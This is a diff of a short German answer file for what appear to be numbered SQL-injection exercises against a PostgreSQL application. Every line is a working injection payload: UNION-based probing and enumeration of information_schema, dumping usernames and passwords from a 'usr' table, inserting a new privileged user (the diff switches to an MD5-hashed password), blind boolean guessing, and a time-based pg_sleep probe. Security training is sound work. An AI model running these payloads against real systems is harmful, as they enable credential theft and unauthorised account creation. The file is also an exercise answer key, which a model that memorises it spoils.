@@ -1,10 +1,10 @@
 Aufgabe  1: ')--
 Aufgabe  2: ') AND 1=2 --
-Aufgabe  3: ') AND 1=2 UNION SELECT null,null,null,null,null,null,null FROM information_schema.tables WHERE table_schema='public‘ --
+Aufgabe  3: ') AND 1=2 UNION SELECT null,null,null,null,null,null,null FROM information_schema.tables WHERE table_schema='public' --
 Aufgabe  4: ') AND 1=2 UNION SELECT null,null,'a',null,null,null,null FROM information_schema.tables WHERE table_schema='public'--
 Aufgabe  5: ') AND 1=2 UNION SELECT null,null,(table_name || ' - ' || column_name),null,null,null,null FROM information_schema.columns WHERE table_schema='public'--
 Aufgabe  6: ') AND 1=2 UNION SELECT null,null,(username || ' - ' || password),null,null,null,null FROM usr --
-Aufgabe  7: '); INSERT INTO usr (id, username, password, authority_id) VALUES (1000, 'aaa', 'aaa', 2); --
+Aufgabe  7: '); INSERT INTO usr (id, username, password, authority_id) VALUES (45678, 'aaa', MD5('aaa'), 2); --
 Aufgabe  9: ' AND 1=(SELECT COUNT(*) FROM guessed_table) --
 Aufgabe 10: ' AND known_table.guessed_column IS NULL –-
 Wortlänge:  '); SELECT CASE WHEN (SELECT LENGTH(username) FROM usr FETCH FIRST 1 ROW ONLY)<6 THEN pg_sleep(4) ELSE null END --
